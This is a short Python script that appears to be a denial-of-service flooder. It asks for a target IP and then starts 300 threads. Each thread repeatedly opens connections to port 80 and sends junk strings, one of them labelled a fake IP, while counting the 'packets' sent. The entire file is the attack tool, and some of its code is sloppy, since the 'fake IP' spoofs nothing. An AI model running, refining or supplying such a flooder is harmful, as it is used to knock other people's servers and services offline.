
import socket,os
import threading
def gooo():
    os.system("cls" or "clear")
    print(
        """
         .:;:.   .:;:.  .:;S;:. .: S;:. 
S     S S     S S     S S  S  S 
`:;S;:' `:;S;:' `:;S;:' `:;S :' 

        """
    )
gooo()
target=input("enter ip : ")
fakeIp="90"
port=80
count=0
def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto((target).encode("ascii"),(target,port))
        s.sendto((fakeIp).encode("ascii"),(target,port))
        
        global count
        count+=1
        print(f"Packet{str(count)} sent ")
        s.close()  
for i in range(300):
    thread=threading.Thread(target=attack)
    thread.start()